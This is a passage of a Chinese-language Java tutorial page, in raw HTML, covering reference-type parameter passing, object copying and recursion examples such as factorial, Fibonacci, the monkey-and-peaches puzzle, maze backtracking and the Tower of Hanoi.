class="hljs-string">&quot;\t&quot;</span>);<br>&#125;<br>System.out.println();<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-09-01%20%E4%B8%8B%E5%8D%886.30.14.png" alt="截屏2022-09-01 下午6.30.14"></p><ul><li><strong>引用数据类型传递的是地址，可以通过形参影响实参。</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test1</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>p.name = <span class="hljs-string">&quot;jack&quot;</span>;<br>p.age = <span class="hljs-number">10</span>;<br><span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>b.test200(p);<br>System.out.println(<span class="hljs-string">&quot;main的p.age=&quot;</span>+p.age);<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>String name;<br><span class="hljs-type">int</span> age;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test200</span><span class="hljs-params">(Person p)</span>&#123;<br>p = <span class="hljs-literal">null</span>; <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-09-01%20%E4%B8%8B%E5%8D%889.11.56.png" alt="截屏2022-09-01 下午9.11.56"></p><p>B类里的p地址指向为空，对main指向的地址无影响。</p><h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h3><blockquote><p>1）编写类MyTools类，编写一个方法可以打印二维数组的数据。<br>2） 编写一个方法copyPerson，可以复制一个Person对象，返回复制的对象。克隆对象，注意要求得到新对象和原来的对象是两个独立的对象，只是他们的属性相同</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test1</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">MyTools</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyTools</span>();<br><span class="hljs-type">int</span>[][] arr = &#123;&#123;<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;,&#123;<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>&#125;,&#123;<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>&#125;&#125;;<br>a.printArr(arr);<br><br><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>p.name = <span class="hljs-string">&quot;milan&quot;</span>;<br>p.age = <span class="hljs-number">100</span>;<br><span class="hljs-comment">//创建tools</span><br><span class="hljs-type">MyTools</span> <span class="hljs-variable">tools</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyTools</span>();<br><span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> tools.copyPerson(p);<br><span class="hljs-comment">//到此 p 和 p2是Person对象，但是是两个独立的对象，属性相同</span><br>System.out.println(<span class="hljs-string">&quot;p的属性 age=&quot;</span> + p.age + <span class="hljs-string">&quot; 名字=&quot;</span> + p.name);<br>System.out.println(<span class="hljs-string">&quot;p2的属性 age=&quot;</span> + p2.age + <span class="hljs-string">&quot; 名字=&quot;</span> + p2.name);<br><span class="hljs-comment">//可以通过输出hashcode看看对象是否是同一个</span><br>System.out.println(p == p2);<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>String name;<br><span class="hljs-type">int</span> age;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTools</span>&#123;<br><span class="hljs-comment">//1）编写类MyTools类，编写一个方法可以打印二维数组的数据。</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printArr</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] map)</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;=====&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt; map.length;i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;map[i].length;j++) &#123;<br>System.out.print(map[i][j]+<span class="hljs-string">&quot;,&quot;</span>);<br>&#125;<br>System.out.println();<br>&#125;<br>&#125;<br><span class="hljs-comment">//2） 编写一个方法copyPerson，可以复制一个Person对象，返回复制的对象。克隆对象，注意要求得到新对象和原来的对象是两个独立的对象，只是他们的属性相同</span><br><span class="hljs-keyword">public</span> Person <span class="hljs-title function_">copyPerson</span><span class="hljs-params">(Person p)</span>&#123;<br><span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>p2.name = p.name;<br>p2.age = p.age;<br><span class="hljs-keyword">return</span> p2;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-方法递归调用"><a href="#6-方法递归调用" class="headerlink" title="6.方法递归调用"></a>6.方法递归调用</h2><p>递归就是方法自己调度自己，每次调用时传入不同的变量，帮助解决复杂问题。</p><ul><li>递归能解决什么问题？</li></ul><ol><li>数学问题：8皇后、汉诺塔、阶乘问题、迷宫问题……</li><li>算法问题：快排、归并排序、二分查找、分治算法……</li><li>用栈解决的问题。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Recursion01</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">T</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">T</span>();<br>t1.test(<span class="hljs-number">4</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span>&#123;<br><span class="hljs-keyword">if</span> (n&gt;<span class="hljs-number">2</span>) &#123;<br>test(n-<span class="hljs-number">1</span>);<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;n=&quot;</span>+n);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>过程：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-09-02%20%E4%B8%8A%E5%8D%889.34.59.png" alt="截屏2022-09-02 上午9.34.59"></p><h3 id="阶乘"><a href="#阶乘" class="headerlink" title="阶乘"></a>阶乘</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Recursion01</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">T</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">T</span>();<br><span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> t1.factorial(<span class="hljs-number">5</span>);<br>System.out.println(<span class="hljs-string">&quot;res=&quot;</span>+res);<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">factorial</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span>&#123;<br><span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> factorial(n-<span class="hljs-number">1</span>)*n;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：res &#x3D; 120</p><h3 id="递归调用的重要规则"><a href="#递归调用的重要规则" class="headerlink" title="递归调用的重要规则"></a>递归调用的重要规则</h3><ol><li>执行一个方法时，就创建一个新的受保护的独立空间（栈空间）。</li><li>方法的局部变量是独立的，不会相互影响， 比如n变量。</li><li>如果方法中使用的是引用类型变量（比如数组，对象），就会共享该引用类型的数据。</li><li>递归必须向退出递归的条件逼近，否则就是无限递归，出现StackOverflowError（栈溢出）。</li><li>当一个方法执行完毕，或者遇到return，就会返回。遵守谁调用，就将结果返回给谁。同时当方法执行完毕或者返回时，该方法也就执行完毕。</li></ol><h3 id="斐波那契"><a href="#斐波那契" class="headerlink" title="斐波那契"></a>斐波那契</h3><blockquote><p>1.请使用递归的方式求出斐波那契数1，1，2，3，5，8，13…给你一个整数n，求出它的值是多</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fibonacci</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">T</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">T</span>();<br>System.out.println(<span class="hljs-string">&quot;当n=7时对应的斐波那契数：&quot;</span>+t1.fibonacci(<span class="hljs-number">7</span>));<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&#123;<br><span class="hljs-comment">//当n=1 为1</span><br><span class="hljs-comment">//当n=2 为1</span><br><span class="hljs-comment">//当n&gt;=3 是前两个数之和</span><br> <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fibonacci</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span>&#123;<br> <span class="hljs-keyword">if</span>(n&gt;=<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span> || n==<span class="hljs-number">2</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> fibonacci(n-<span class="hljs-number">1</span>)+fibonacci(n-<span class="hljs-number">2</span>);&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;输入有误。&quot;</span>);<br><span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="猴子吃桃"><a href="#猴子吃桃" class="headerlink" title="猴子吃桃"></a>猴子吃桃</h3><blockquote><p>2.猴子吃桃子问题:有一堆桃子，猴子第一天吃了其中的一半，并再多吃了一个！以后每天猴子都吃其中的一半，然后再多吃一个。当到第10天时，想再吃时（即还没吃），发现只有1个桃子了。问题：最初共多少个桃子?</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Peach</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">T</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">T</span>();<br><span class="hljs-comment">//桃子问题</span><br><span class="hljs-type">int</span> <span class="hljs-variable">day</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">peachNum</span> <span class="hljs-operator">=</span> p.peach(day);<br><span class="hljs-keyword">if</span> (peachNum != -<span class="hljs-number">1</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;第&quot;</span>+day+<span class="hljs-string">&quot;天有&quot;</span>+peachNum+<span class="hljs-string">&quot;个桃子。&quot;</span>);<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&#123;<br><span class="hljs-comment">//思路分析 逆推</span><br><span class="hljs-comment">//day = 10时，有1个桃子</span><br><span class="hljs-comment">//day = 9时， 有（day10+1）*2 = 4</span><br><span class="hljs-comment">//day = 8时， 有（day9+1）*2 = 10个</span><br><span class="hljs-comment">//规律：前一天的桃子 = （后一天的桃子+1）*2</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">peach</span><span class="hljs-params">(<span class="hljs-type">int</span> day)</span>&#123;<br><span class="hljs-keyword">if</span> (day == <span class="hljs-number">10</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (day&gt;=<span class="hljs-number">1</span> &amp;&amp; day &lt;=<span class="hljs-number">9</span>) &#123;<br><span class="hljs-keyword">return</span> (peach(day+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>)*<span class="hljs-number">2</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;day应在1-10天。&quot;</span>);<br><span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果，第1天有1534个桃子。</p><h3 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h3><blockquote><p>1.小球得到的路径，和程序员设置的找路策略有关即：找路的上下左右的顺序相关<br>2.再得到小球路径时，可以先使用（下右上左），再改成（上右下左），看看路径是不是有变化</p><p>3.测试回溯现象</p><p>4.扩展思考:如何求出最短路径?</p></blockquote><p>地图：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-09-03%20%E4%B8%8B%E5%8D%885.51.36.png" alt="截屏2022-09-03 下午5.51.36"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Labyrinth</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//创建迷宫(0可以走，1表示障碍物)</span><br><span class="hljs-type">int</span>[][] map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">8</span>][<span class="hljs-number">7</span>];<br><span class="hljs-comment">//最上面一行和最下面的一行，全部设置为1</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">7</span>;i++) &#123;<br>map[<span class="hljs-number">0</span>][i]=<span class="hljs-number">1</span>;<br>map[<span class="hljs-number">7</span>][i]=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">//将最右边的一列和最左面的一列，全部设置为1</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">8</span>;i++) &#123;<br>map[i][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>map[i][<span class="hljs-number">6</span>] = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">//多出来的两块</span><br>map[<span class="hljs-number">3</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>map[<span class="hljs-number">3</span>][<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">//输入当前的地图</span><br>System.out.println(<span class="hljs-string">&quot;=======当前地图情况========&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;map.length;i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;map[i].length;j++) &#123;<br>System.out.print(map[i][j] + <span class="hljs-string">&quot; &quot;</span>);<br>&#125;<br>System.out.println();<br>&#125;<br><br><span class="hljs-comment">//使用findWay</span><br><span class="hljs-type">T</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">T</span>();<br>t1.findWay(map,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>System.out.println(<span class="hljs-string">&quot;\n找路的情况如下：&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;map.length;i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;map[i].length;j++) &#123;<br>System.out.print(map[i][j] + <span class="hljs-string">&quot; &quot;</span>);<br>&#125;<br>System.out.println();<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&#123;<br><span class="hljs-comment">//使用递归回溯的思想来解决老鼠出迷宫</span><br><span class="hljs-comment">//如果找到，就返回true，如果没找到，就返回false</span><br><span class="hljs-comment">//map为迷宫</span><br><span class="hljs-comment">//i和j表示小老鼠的位置</span><br><span class="hljs-comment">//走前：0表示可以走，1表示障碍物。</span><br><span class="hljs-comment">//走过：2表示可以走，3表示走不通</span><br><span class="hljs-comment">//当map[6][5] = 2（终点）时，即可结束</span><br><span class="hljs-comment">//确定老鼠找路策略，下-》右-》上-》左</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">findWay</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] map,<span class="hljs-type">int</span> i,<span class="hljs-type">int</span> j)</span>&#123;<br><span class="hljs-keyword">if</span> (map[<span class="hljs-number">6</span>][<span class="hljs-number">5</span>]==<span class="hljs-number">2</span>) &#123; <span class="hljs-comment">//说明找到终点</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span> (map[i][j] == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//当这个位置0，说明表示可以走</span><br><span class="hljs-comment">//我们假定可以走通</span><br><span class="hljs-comment">//假定可以走通</span><br>map[i][j] =<span class="hljs-number">2</span>;<br><span class="hljs-comment">//使用找路策略，确定该位置确定可以走通</span><br><span class="hljs-comment">//下-》右-》上-》左</span><br><span class="hljs-keyword">if</span> (findWay(map,i+<span class="hljs-number">1</span>,j)) &#123; <span class="hljs-comment">//先走下</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (findWay(map,i,j+<span class="hljs-number">1</span>)) &#123;<span class="hljs-comment">//走右</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (findWay(map,i-<span class="hljs-number">1</span>,j))&#123;<span class="hljs-comment">//走上</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (findWay(map,i,j-<span class="hljs-number">1</span>))&#123;<span class="hljs-comment">//走左</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123; <span class="hljs-comment">//都走不通</span><br>map[i][j]=<span class="hljs-number">3</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123; <span class="hljs-comment">//map[i][j] = 1,2,3</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-09-03%20%E4%B8%8B%E5%8D%888.10.14.png" alt="截屏2022-09-03 下午8.10.14" style="zoom:50%;" /><p>改成上→右→下→左：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-09-03%20%E4%B8%8B%E5%8D%888.10.14.png" style="zoom:50%;" /><p>增加障碍第3行第3列（测试回溯）。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220903213108024.png" alt="image-20220903213108024" style="zoom:50%;" /><h3 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HanoiTower</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Tower</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Tower</span>();<br>t.move(<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tower</span>&#123;<br><span class="hljs-comment">//num表示要移动的个数，a,b,c分别表示A塔，B塔，C塔</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">move</span><span class="hljs-params">(<span class="hljs-type">int</span> num,<span class="hljs-type">char</span> a,<span class="hljs-type">char</span> b,<span class="hljs-type">char</span> c)</span>&#123;<br><span class="hljs-comment">//如果只有1个盘，num=1</span><br><span class="hljs-keyword">if</span> (num == <span class="hljs-number">1</span>) &#123;<br>System.out.println(a+<span class="hljs-string">&quot;-&gt;&quot;</span>+c);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-comment">//如果有多个盘，可以看成两部分，最下面和上面的其他盘</span><br><span class="hljs-comment">//(1）先移动上面所有的盘子到b，借助c</span><br>move(num-<span class="hljs-number">1</span>,a,c,b);<br><span class="hljs-comment">//(2)把最下面的盘，移动到c</span><br>System.out.println(a+<span class="hljs-string">&quot;-&gt;&quot;</span>+c);<br><span class="hljs-comment">//(3)把b的所有盘，移动到c,借助a</span><br>move(num-<span class="hljs-number">1</span>,b,a,c);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220904185330731.png" alt="image-20220904185330731" style="zoom:50%;" /><h3 id="八皇后"><a href="#八皇后" class="headerlink" 